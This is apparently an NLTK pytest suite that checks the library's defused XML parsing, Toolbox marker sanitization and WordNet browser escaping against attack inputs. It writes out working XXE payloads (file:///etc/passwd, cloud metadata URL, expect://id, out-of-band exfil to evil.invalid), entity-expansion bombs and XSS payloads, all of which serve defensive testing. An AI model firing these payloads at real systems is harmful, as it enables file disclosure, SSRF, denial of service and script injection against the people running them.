# Natural Language Toolkit: expanded XML / XSS / markup-injection attack harness
#
# Copyright (C) 2001-2026 NLTK Project
# URL: <https://www.nltk.org/>
# For license information, see LICENSE.TXT

"""Expanded attack matrix for NLTK's XML / XSS / markup-injection guards.

This file is a net-new companion to ``test_xmlsec.py``,
``test_xml_attack_matrix.py``, ``test_xml_entity_expansion_security.py``,
``test_toolbox_xss.py`` and ``test_mte_isolation.py``. It adds vectors those
files do not already exercise and drives them through the real guards:

* ``nltk.xmlsec`` (the defused ``parse`` / ``fromstring`` used by the corpus
  readers): every entity declaration or external reference must be refused, on
  BOTH back ends (``defusedxml`` present, and the standard-library fallback used
  when it is absent).
* ``nltk.toolbox`` standard-format-marker sanitization (issue #3800): an injected
  marker must never reach the parsed tree, or an HTML / XSS sink, as a live tag.
* ``nltk.app.wordnet_app`` reflected-query escaping (GHSA-gfwx-w7gr-fvh7): a
  hostile query must come back HTML-escaped, never as a live tag or a
  ``javascript:`` sink.
* ``nltk.corpus.reader.bcp47`` / ``nltk.corpus.reader.mte``: entity-expansion in
  the corpus XML must be refused, and MTE tag filters must stay isolated per
  lazy view even when views are consumed interleaved.

Guarantees asserted for every hostile input:

* it raises (``EntitiesForbidden`` / ``ParseError`` / ``PermissionError``) OR it
  parses with the entity UNEXPANDED and with NO network or file fetch, and
* teeth: an expansion payload that the guard refuses is shown to actually expand
  under stock ``xml.etree.ElementTree``, and an external reference is checked
  against a REAL listening socket that must receive ZERO connections.

Cross-platform: ``file:///etc/passwd`` is bait only (the raised exception is
asserted, never file contents), ``defusedxml`` is reached through
``importorskip`` / ``monkeypatch``, the socket test binds ``127.0.0.1`` on an
ephemeral port, and every text file is read with ``encoding="utf-8"``.
"""

import html
import importlib
import io
import os
import socket
import sys
import threading
from xml.etree import ElementTree as StockET
from xml.etree.ElementTree import ParseError

import pytest

from nltk import xmlsec

# ===========================================================================
# Payload builders
# ===========================================================================

#: A short unique string an external-entity file read would have to disclose.
SENTINEL = "NLTK-XXE-SENTINEL-9f3c1a"


def _billion_laughs(levels=9, seed="lol"):
    """A classic nested ``lol1..lolN`` billion-laughs document."""
    decls = "".join(
        f'<!ENTITY lol{i} "{f"&lol{i - 1};" * 10}">' for i in range(1, levels + 1)
    )
    return (
        '<?xml version="1.0"?>'
        f'<!DOCTYPE lolz [<!ENTITY lol0 "{seed}">{decls}]>'
        f"<lolz>&lol{levels};</lolz>"
    )


def _quadratic(entity_size=20000, refs=100):
    """A quadratic-blowup payload: one big entity referenced many times."""
    return (
        '<?xml version="1.0"?>'
        f'<!DOCTYPE d [<!ENTITY a "{"A" * entity_size}">]>'
        f"<d>{'&a;' * refs}</d>"
    )


def _wide_deep(width=50):
    """A bomb that is both wide and deep: many entities each fanning out."""
    wide = "".join(
        f'<!ENTITY w{i} "&base;&base;&base;&base;&base;">' for i in range(width)
    )
    refs = "".join(f"&w{i};" for i in range(width))
    return (
        '<?xml version="1.0"?>'
        f'<!DOCTYPE d [<!ENTITY base "AAAAAAAAAA">{wide}]>'
        f"<d>{refs}</d>"
    )


def _flat_entity():
    """A FLAT entity: stock ElementTree expands it, so it makes a clean teeth
    demo that stays well under libexpat's amplification threshold."""
    return (
        '<?xml version="1.0"?>'
        f'<!DOCTYPE d [<!ENTITY a "{"A" * 5000}">]>'
        f"<d>{'&a;' * 50}</d>"
    )


# Every one of these DECLARES or REFERENCES an entity and must be refused.
XXE_REJECTED = {
    "xxe-file-system": (
        '<?xml version="1.0"?>'
        '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>'
    ),
    "xxe-http-external": (
        '<?xml version="1.0"?>'
        '<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest">]>'
        "<r>&xxe;</r>"
    ),
    "xxe-php-filter": (
        '<?xml version="1.0"?>'
        "<!DOCTYPE r [<!ENTITY xxe SYSTEM "
        '"php://filter/convert.base64-encode/resource=/etc/passwd">]><r>&xxe;</r>'
    ),
    "xxe-expect": (
        '<?xml version="1.0"?>'
        '<!DOCTYPE r [<!ENTITY xxe SYSTEM "expect://id">]><r>&xxe;</r>'
    ),
    "parameter-entity": ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % pe "x">]><r/>'),
    "parameter-entity-external": (
        '<?xml version="1.0"?>'
        '<!DOCTYPE r [<!ENTITY % pe SYSTEM "file:///etc/passwd">%pe;]><r/>'
    ),
    "recursive-entity": (
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY a "&a;">]><r>&a;</r>'
    ),
    "oob-parameter-exfil": (
        '<?xml version="1.0"?>'
        '<!DOCTYPE r [<!ENTITY % remote SYSTEM "http://evil.invalid/">%remote;]><r/>'
    ),
    "external-general-entity-decl": (
        '<?xml version="1.0"?>'
        '<!DOCTYPE r [<!ENTITY ext SYSTEM "http://evil.invalid/x">]><r>hi</r>'
    ),
}

EXPANSION_REJECTED = {
    "billion-laughs-9": _billion_laughs(levels=9),
    "quadratic-blowup": _quadratic(),
    "wide-and-deep": _wide_deep(),
}

# These merely NAME an external DTD; ElementTree never fetches it, so they PARSE
# but must issue no outbound request. They are checked against a live socket.
EXTERNAL_DTD_NO_FETCH = {
    "external-dtd-system": (
        '<?xml version="1.0"?>'
        '<!DOCTYPE r SYSTEM "http://{host}:{port}/x.dtd"><r>x</r>'
    ),
    "external-dtd-public": (
        '<?xml version="1.0"?>'
        '<!DOCTYPE r PUBLIC "-//X//DTD Made Up//EN" '
        '"http://{host}:{port}/x.dtd"><r>x</r>'
    ),
}

# These reference an external resource and must be refused before any fetch; the
# same socket check proves the refusal happens with zero outbound requests.
EXTERNAL_REF_NO_FETCH = {
    "oob-parameter": (
        '<?xml version="1.0"?>'
        '<!DOCTYPE r [<!ENTITY % rem SYSTEM "http://{host}:{port}/">%rem;]><r/>'
    ),
    "external-general-entity": (
        '<?xml version="1.0"?>'
        '<!DOCTYPE r [<!ENTITY x SYSTEM "http://{host}:{port}/">]><r>&x;</r>'
    ),
}

# Benign controls that must keep parsing.
BENIGN_XML = {
    "nested-tree": "<corpus><doc id='1'><w pos='NN'>cat</w></doc></corpus>",
    "builtin-escapes": "<d><w>a &amp; b &lt; c &gt; d</w></d>",
    "external-subset-named": '<!DOCTYPE d SYSTEM "apf.dtd"><d><w>Bob</w></d>',
    "public-id-named": ('<!DOCTYPE d PUBLIC "-//X//DTD//EN" "x.dtd"><d><w>Bob</w></d>'),
    "cdata-entity-text": '<d><w><![CDATA[<!ENTITY a "x">]]></w></d>',
}


# ===========================================================================
# Back-end fixture: force defusedxml present, then force the fallback
# ===========================================================================


@pytest.fixture(params=["defusedxml", "fallback"])
def backend(request, monkeypatch):
    """``nltk.xmlsec`` with each back end forced, restored on teardown.

    The fallback path is the standard-library pre-scan used when ``defusedxml``
    is not installed; forcing it here exercises that guard even on a machine
    where ``defusedxml`` is present.
    """
    if request.param == "defusedxml":
        pytest.importorskip("defusedxml")
        module = importlib.reload(xmlsec)
        assert module.HAVE_DEFUSEDXML
    else:
        # Hiding the module makes ``import defusedxml`` raise ImportError, so the
        # reload selects the standard-library pre-scan path.
        monkeypatch.setitem(sys.modules, "defusedxml", None)
        module = importlib.reload(xmlsec)
        assert not module.HAVE_DEFUSEDXML
    yield module
    # Undo the patch before reloading so the module is left on its real back end.
    monkeypatch.undo()
    importlib.reload(xmlsec)


def _raises_guard(func, *args):
    """Assert ``func(*args)`` raises the entity guard, not something incidental."""
    with pytest.raises((ValueError, ParseError)) as excinfo:
        func(*args)
    name = type(excinfo.value).__name__
    assert "Forbidden" in name or "Entit" in str(excinfo.value) or name == "ParseError"
    return excinfo.value


# ===========================================================================
# 1. XXE: external entities, parameter entities, recursion, OOB exfil
# ===========================================================================


@pytest.mark.parametrize("payload", list(XXE_REJECTED.values()), ids=list(XXE_REJECTED))
def test_xxe_declarations_are_refused(backend, payload):
    """Every XXE flavour is refused by both ``fromstring`` and ``parse``."""
    _raises_guard(backend.fromstring, payload)
    _raises_guard(backend.parse, io.StringIO(payload))


def test_file_entity_does_not_disclose_a_real_sentinel(backend, tmp_path):
    """An external file entity pointed at a real on-disk file must not read it.

    The file exists and holds a unique canary; the parse must raise before the
    canary can appear anywhere. ``file:///etc/passwd`` is bait only elsewhere;
    here a real file removes any doubt about whether disclosure was possible.
    """
    secret = tmp_path / "secret.txt"
    secret.write_text(SENTINEL, encoding="utf-8")
    uri = secret.as_uri()
    payload = (
        '<?xml version="1.0"?>'
        f'<!DOCTYPE r [<!ENTITY xxe SYSTEM "{uri}">]><r>&xxe;</r>'
    )
    error = _raises_guard(backend.fromstring, payload)
    assert SENTINEL not in str(error)


# ===========================================================================
# 2. Billion-laughs / entity-expansion, with teeth against stock ElementTree
# ===========================================================================


@pytest.mark.parametrize(
    "payload", list(EXPANSION_REJECTED.values()), ids=list(EXPANSION_REJECTED)
)
def test_entity_expansion_is_refused(backend, payload):
    """Nested, quadratic and wide-and-deep bombs are all refused outright."""
    _raises_guard(backend.fromstring, payload)
    _raises_guard(backend.parse, io.StringIO(payload))


def test_teeth_flat_entity_expands_under_stock_elementtree():
    """Teeth: the payload NLTK refuses really does expand under stock parsing.

    A flat entity is expanded by ``xml.etree.ElementTree`` (it stays under
    libexpat's amplification threshold), so a guard that stopped working would
    let the same document balloon in memory.
    """
    payload = _flat_entity()
    stock = StockET.fromstring(payload)
    assert len(stock.text) == 5000 * 50  # stock expands it
    _raises_guard(xmlsec.fromstring, payload)  # xmlsec refuses the same bytes


def test_teeth_nested_bomb_expands_under_stock_elementtree():
    """A modest nested bomb expands under stock ElementTree but is refused here."""
    payload = _billion_laughs(levels=3, seed="AAAAAAAAAA")
    stock = StockET.fromstring(payload)
    assert len(stock.text) == 10 * 10**3  # 10-char seed, three x10 levels
    _raises_guard(xmlsec.fromstring, payload)


def test_utf16_encoded_bomb_is_screened(backend):
    """A non-ASCII encoding must not smuggle a declaration past the pre-scan."""
    payload = _billion_laughs(levels=6).encode("utf-16")
    _raises_guard(backend.parse, io.BytesIO(payload))


# ===========================================================================
# 3. External DTD / SSRF: a real socket must receive ZERO connections
# ===========================================================================


class _Listener:
    """A one-shot loopback listener that records any bytes it receives."""

    def __init__(self):
        self.sock = socket.socket()
        self.sock.bind(("127.0.0.1", 0))
        self.sock.listen(1)
        self.sock.settimeout(3)
        self.host, self.port = self.sock.getsockname()
        self.connections = []
        self._thread = threading.Thread(target=self._accept, daemon=True)
        self._thread.start()

    def _accept(self):
        try:
            connection, _ = self.sock.accept()
            self.connections.append(connection.recv(64))
            connection.close()
        except OSError:
            pass

    def close(self):
        self._thread.join(timeout=3)
        self.sock.close()


@pytest.mark.parametrize(
    "template", list(EXTERNAL_DTD_NO_FETCH.values()), ids=list(EXTERNAL_DTD_NO_FETCH)
)
def test_external_dtd_named_but_never_fetched(backend, template):
    """A DOCTYPE naming an external DTD parses, but no request must go out."""
    listener = _Listener()
    payload = template.format(host=listener.host, port=listener.port)
    try:
        backend.fromstring(payload)  # naming an external subset is allowed
    except (ValueError, ParseError):
        pass
    finally:
        listener.close()
    assert listener.connections == [], "the parser fetched the external DTD (SSRF)"


@pytest.mark.parametrize(
    "template", list(EXTERNAL_REF_NO_FETCH.values()), ids=list(EXTERNAL_REF_NO_FETCH)
)
def test_external_reference_refused_with_zero_connections(backend, template):
    """An external entity / parameter entity is refused AND never fetched."""
    listener = _Listener()
    payload = template.format(host=listener.host, port=listener.port)
    try:
        _raises_guard(backend.fromstring, payload)
    finally:
        listener.close()
    assert listener.connections == [], "refusal still leaked an outbound request"


# ===========================================================================
# 4. Benign controls: ordinary XML must keep round-tripping
# ===========================================================================


@pytest.mark.parametrize("payload", list(BENIGN_XML.values()), ids=list(BENIGN_XML))
def test_benign_xml_still_parses(backend, payload):
    root = backend.fromstring(payload)
    assert root.iter("w") is not None
    assert backend.parse(io.StringIO(payload)).getroot() is not None


def test_benign_nested_tree_has_the_right_shape(backend):
    """A normal document parses to the expected element tree, attributes intact."""
    root = backend.fromstring(
        "<corpus><doc id='1'><w pos='NN'>cat</w><w pos='NN'>dog</w></doc></corpus>"
    )
    words = root.findall("./doc/w")
    assert [w.text for w in words] == ["cat", "dog"]
    assert [w.attrib["pos"] for w in words] == ["NN", "NN"]
    assert root.find("./doc").attrib["id"] == "1"


# ===========================================================================
# 5. Toolbox standard-format-marker sanitization (issue #3800)
# ===========================================================================


def _parse_toolbox(sfm):
    """Parse a standard-format-marker string to serialized XML."""
    from xml.etree.ElementTree import tostring

    from nltk.toolbox import ToolboxData

    data = ToolboxData()
    data.open_string(sfm)
    return tostring(data.parse(), encoding="unicode")


def test_toolbox_injected_markers_are_neutralized():
    """A hostile ``\\marker`` name must never become a live tag in the tree.

    The marker token is what names an XML element; an injected ``<script>`` or
    ``<!ENTITY`` or dangerous element name in that position must be sanitized to
    an inert element name, not emitted verbatim.
    """
    sfm = (
        "\\_sh v3.0 400 Test\n"
        "\\lx kaa\n"
        "\\<!ENTITY smuggled\n"
        "\\x><script> payload\n"
        "\\iframe hostile\n"
        "\\style body{}\n"
    )
    xml = _parse_toolbox(sfm)

    # No hostile markup survives as a live tag.
    assert "<script>" not in xml
    assert "<!ENTITY" not in xml
    assert "<iframe>" not in xml
    assert "<style>" not in xml
    # Dangerous element names are namespaced away with the safe prefix.
    assert "<tb_iframe>" in xml
    assert "<tb_style>" in xml
    # The angle brackets and bang in an injected marker are replaced, not kept.
    assert "<x__script_>" in xml
    assert "<__ENTITY>" in xml
    # The benign content is still there.
    assert "kaa" in xml


def test_toolbox_marker_cannot_start_with_digit_or_control_char():
    """Markers starting with a digit, and control chars anywhere, are sanitized."""
    sfm = "\\_sh header\n\\lx word\n\\123bad value\n\\lx\x00ctrl trailing\n"
    xml = _parse_toolbox(sfm)
    assert "<123bad>" not in xml  # XML names cannot start with a digit
    assert "<_123bad>" in xml
    assert "\x00" not in xml  # the control char is gone


def test_toolbox_field_value_is_escaped_not_injected():
    """Markup in a field VALUE is XML-escaped text, never parsed as structure."""
    sfm = "\\_sh header\n\\lx <script>alert(1)</script>\n"
    xml = _parse_toolbox(sfm)
    assert "<script>" not in xml  # not a live tag
    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in xml  # inert escaped text


def test_toolbox_benign_record_round_trips():
    """A perfectly ordinary Toolbox record still parses to the expected tree."""
    from nltk.toolbox import ToolboxData

    sfm = "\\_sh v3.0 400 Rotokas\n\\lx kaa\n\\ps V.A\n\\ge gag\n"
    data = ToolboxData()
    data.open_string(sfm)
    tree = data.parse()
    record = tree.find("record")
    assert record.find("lx").text == "kaa"
    assert record.find("ps").text == "V.A"
    assert record.find("ge").text == "gag"


# ===========================================================================
# 6. wordnet browser app: reflected-query XSS escaping (GHSA-gfwx-w7gr-fvh7)
# ===========================================================================


def _wordnet_available():
    from nltk.data import find

    try:
        find("corpora/wordnet.zip")
        return True
    except LookupError:
        return False


requires_wordnet = pytest.mark.skipif(
    not _wordnet_available(), reason="wordnet corpus not installed"
)

XSS_PAYLOADS = {
    "script-tag": "<script>alert(1)</script>",
    "img-onerror": '"><img onerror>',
    "svg-onload": "'><svg/onload=alert(1)>",
    "javascript-uri": "javascript:alert(1)",
    "entity-encoded-script": "&lt;script&gt;alert(1)&lt;/script&gt;",
}


@requires_wordnet
@pytest.mark.parametrize("payload", list(XSS_PAYLOADS.values()), ids=list(XSS_PAYLOADS))
def test_wordnet_page_from_word_escapes_hostile_query(payload):
    """The reflected word must be HTML-escaped, with no live tag or js sink."""
    from nltk.app.wordnet_app import page_from_word

    body, _ = page_from_word(payload)
    lowered = body.lower()
    # No live executable markup breaks out of the text context.
    assert "<script" not in lowered
    assert "<img" not in lowered
    assert "<svg" not in lowered
    # No javascript: URI lands inside an attribute sink.
    assert 'href="javascript:' not in lowered
    assert 'src="javascript:' not in lowered
    # The payload is present only in its html.escape form.
    assert html.escape(payload) in body


@requires_wordnet
@pytest.mark.parametrize(
    "payload",
    ["<script>alert(1)</script>", '"><img onerror>', "javascript:alert(1)"],
    ids=["script", "img", "javascript-uri"],
)
def test_wordnet_search_route_escapes_reflected_query(payload):
    """Drive the real ``search`` route in-process; the reflection must be safe.

    The ``&`` and ``=`` delimiters are excluded from these payloads so they
    survive the handler's own query splitting and reach the escaping sink.
    """
    import nltk.app.wordnet_app as wa

    handler = wa.MyServerHandler.__new__(wa.MyServerHandler)
    handler.wfile = io.BytesIO()
    handler.path = "/search?nextWord=" + payload
    handler.send_response = lambda *a, **k: None
    handler.send_header = lambda *a, **k: None
    handler.end_headers = lambda: None
    handler.do_GET()
    out = handler.wfile.getvalue().decode("utf-8", "replace").lower()
    assert "<script>alert" not in out
    assert "<img onerror" not in out
    assert 'href="javascript:' not in out


@requires_wordnet
def test_wordnet_benign_query_renders_safe_text():
    """A benign query renders normally and reflects its (harmless) word."""
    from nltk.app.wordnet_app import page_from_word

    body, word = page_from_word("dog")
    assert word == "dog"
    assert "<script" not in body.lower()
    assert body  # a real page was produced


# ===========================================================================
# 7. bcp47 corpus reader: entity-expansion in the CLDR XML must be refused
# ===========================================================================

_IANA_REGISTRY = (
    "File-Date: 2024-01-01\n%%\nType: language\nSubtag: en\nDescription: English\n"
)

_CLDR_BOMB = (
    '<?xml version="1.0"?>'
    "<!DOCTYPE ldml ["
    '<!ENTITY a0 "AAAAAAAAAA">'
    '<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">'
    '<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">'
    "]>"
    "<ldml><localeDisplayNames><subdivisions>"
    '<subdivision type="x">&a2;</subdivision>'
    "</subdivisions></localeDisplayNames></ldml>"
)

_CLDR_BENIGN = (
    '<?xml version="1.0"?>'
    "<ldml><localeDisplayNames><subdivisions>"
    '<subdivision type="fr64">Pyrenees</subdivision>'
    "</subdivisions></localeDisplayNames></ldml>"
)


def _build_bcp47_corpus(tmp_path, cldr_xml):
    import nltk.data

    (tmp_path / "iana").mkdir()
    (tmp_path / "cldr").mkdir()
    (tmp_path / "iana" / "language-subtag-registry.txt").write_text(
        _IANA_REGISTRY, encoding="utf-8"
    )
    (tmp_path / "cldr" / "common-subdivisions-en.xml").write_text(
        cldr_xml, encoding="utf-8"
    )
    root = str(tmp_path)
    if root not in nltk.data.path:
        nltk.data.path.append(root)
    return root


def test_bcp47_reader_refuses_entity_bomb(tmp_path):
    """A billion-laughs bomb in the CLDR subdivisions file must be refused."""
    import nltk.data
    from nltk.corpus.reader.bcp47 import BCP47CorpusReader

    root = _build_bcp47_corpus(tmp_path, _CLDR_BOMB)
    try:
        with pytest.raises((ValueError, ParseError)) as excinfo:
            BCP47CorpusReader(root, [r".*"])
        name = type(excinfo.value).__name__
        assert "Forbidden" in name or "Entit" in str(excinfo.value)
    finally:
        if root in nltk.data.path:
            nltk.data.path.remove(root)


def test_bcp47_reader_parses_benign_cldr(tmp_path):
    """A well-formed CLDR subdivisions file still loads into the reader."""
    import nltk.data
    from nltk.corpus.reader.bcp47 import BCP47CorpusReader

    root = _build_bcp47_corpus(tmp_path, _CLDR_BENIGN)
    try:
        reader = BCP47CorpusReader(root, [r".*"])
        assert reader.subdiv["fr64"] == "Pyrenees"
    finally:
        if root in nltk.data.path:
            nltk.data.path.remove(root)


# ===========================================================================
# 8. MTE corpus reader: entity refusal + per-view tag-filter isolation
# ===========================================================================

_MTE_HEADER = '<?xml version="1.0" encoding="UTF-8"?>\n'

_MTE_BOMB = (
    _MTE_HEADER + "<!DOCTYPE TEI ["
    '<!ENTITY a0 "AAAAAAAAAA">'
    '<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">'
    '<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">'
    "]>\n"
    '<TEI xmlns="https://www.tei-c.org/ns/1.0"><text><body><div><div><p><s>'
    '<w ana="Ncmsn" lemma="x">&a2;</w>'
    "</s></p></div></div></body></text></TEI>"
)

_MTE_MIXED = (
    _MTE_HEADER
    + '<TEI xmlns="https://www.tei-c.org/ns/1.0"><text><body><div><div><p><s>'
    '<w ana="Ncmsn" lemma="secret">NOUN1</w>'
    '<w ana="Vmip3s" lemma="public">VERB1</w>'
    '<w ana="Ncmsn" lemma="s2">NOUN2</w>'
    '<w ana="Vmip3s" lemma="p2">VERB2</w>'
    "</s></p></div></div></body></text></TEI>"
)


def _mte_reader(tmp_path, name, xml):
    import nltk.data
    from nltk.corpus.reader.mte import MTECorpusReader

    (tmp_path / name).write_text(xml, encoding="utf-8")
    root = str(tmp_path)
    if root not in nltk.data.path:
        nltk.data.path.append(root)
    return MTECorpusReader(root, [name]), root


def test_mte_reader_refuses_entity_bomb(tmp_path):
    """An entity bomb in an MTE TEI file must not expand.

    The lazy view parses element blocks with the defused parser, so the bomb is
    either refused or its entity reference is left undefined. Either way it never
    balloons in memory.
    """
    import nltk.data

    reader, root = _mte_reader(tmp_path, "bomb.xml", _MTE_BOMB)
    try:
        with pytest.raises((ValueError, ParseError)):
            list(reader.tagged_words(tags="N"))
    finally:
        if root in nltk.data.path:
            nltk.data.path.remove(root)


def test_mte_tag_filters_isolated_across_interleaved_views(tmp_path):
    """Three lazy views with different filters must not corrupt one another.

    Each ``tagged_words`` call builds its own reader with private ``_tags`` /
    ``_tagset`` state; consuming the views interleaved (one element from each,
    round robin) must not let one view's filter bleed into another.
    """
    import nltk.data

    reader, root = _mte_reader(tmp_path, "mixed.xml", _MTE_MIXED)
    try:
        nouns = iter(reader.tagged_words(tags="N"))
        verbs = iter(reader.tagged_words(tags="V"))
        every = iter(reader.tagged_words(tags=""))

        assert next(nouns) == ("NOUN1", "Ncmsn")
        assert next(verbs) == ("VERB1", "Vmip3s")
        assert next(every) == ("NOUN1", "Ncmsn")
        assert next(nouns) == ("NOUN2", "Ncmsn")
        assert next(verbs) == ("VERB2", "Vmip3s")

        # Fresh full passes confirm each filter kept its own identity.
        assert list(reader.tagged_words(tags="N")) == [
            ("NOUN1", "Ncmsn"),
            ("NOUN2", "Ncmsn"),
        ]
        assert list(reader.tagged_words(tags="V")) == [
            ("VERB1", "Vmip3s"),
            ("VERB2", "Vmip3s"),
        ]
    finally:
        if root in nltk.data.path:
            nltk.data.path.remove(root)
